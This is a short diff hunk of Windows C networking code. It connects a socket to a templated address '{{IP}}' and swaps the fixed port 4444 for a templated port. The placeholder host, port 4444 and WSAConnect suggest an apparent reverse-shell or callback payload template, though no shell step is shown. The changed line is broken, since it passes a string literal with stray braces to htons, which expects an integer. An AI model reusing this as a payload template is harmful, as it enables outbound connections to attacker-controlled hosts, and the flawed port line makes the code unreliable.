@@ -11,7 +11,7 @@ int main() {
 
     server.sin_family = AF_INET;
     server.sin_addr.s_addr = inet_addr("{{IP}}"); 
-    server.sin_port = htons(4444);                     
+    server.sin_port = htons("{{{PORT}}}");                     
 
     WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL);
 
